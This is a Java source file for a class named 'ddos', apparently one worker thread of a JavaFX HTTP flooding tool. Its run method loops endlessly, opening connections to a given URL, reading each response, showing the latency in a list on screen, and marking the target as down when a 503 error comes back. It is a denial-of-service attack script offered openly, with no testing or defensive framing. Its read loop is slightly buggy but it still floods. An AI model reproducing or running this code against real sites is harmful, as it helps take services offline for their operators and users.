package sample;

import javafx.application.Platform;
//import javafx.scene.Scene;
import javafx.scene.control.Label;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;

import java.net.URL;

import java.util.Date;

public class ddos implements Runnable {
//    Stage window;
//    Scene scene;
//    Label label;
    HttpURLConnection connection;
    String responseMessage,timeDelay;
    String request;
    URL url;
     int reponseCode;
    public ddos(String request){
        this.request = request;

  }
    @Override
    public void run() {
        Date before, after;
        while (true) {
            try {
                before = new Date();
                url = new URL(request);
                connection = (HttpURLConnection) url.openConnection();
//
                //connection.setRequestMethod("GET");

                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuffer bf = new StringBuffer();
                String line = "";
                while (reader.readLine() != null) {
                    bf.append(line);
                }
                reader.close();
                after = new Date();


                //just trial


                setResponseMessage(connection.getResponseMessage());
                setTimeDelay((after.getTime() - before.getTime()) + "");
                reponseCode = connection.getResponseCode();

                //new runnable
                Platform.runLater(() -> {
                    System.out.println("" + getResponseMessage() + " time delay: " + getTimeDelay());
                    Label l = new Label("" + getResponseMessage() + " time delay: " + getTimeDelay());

                    l.setStyle(" -fx-text-fill: green;");
                    Main.result.getItems().add(l);

                });


                //System.out.println(bf.toString());

            } catch (Exception e) {
                Platform.runLater(new Runnable() {
                    @Override
                    public void run() {
                        if(!(reponseCode==503)){
                            Label l = new Label(e.getMessage());

                            l.setStyle(" -fx-text-fill: red;");

                            Main.result.getItems().add(l);

                        }
                        else {
                            Main.isAlive = false;
                        }



                    }
                });

            }


        }
    }

    //let see what happen


    public String getResponseMessage(){
        return responseMessage;
    }
    public  String getTimeDelay(){
        return timeDelay;
    }

    private void setResponseMessage(String resp){
        this.responseMessage = resp;
    }
    private void setTimeDelay(String delay){
        this.timeDelay = delay;
    }

}
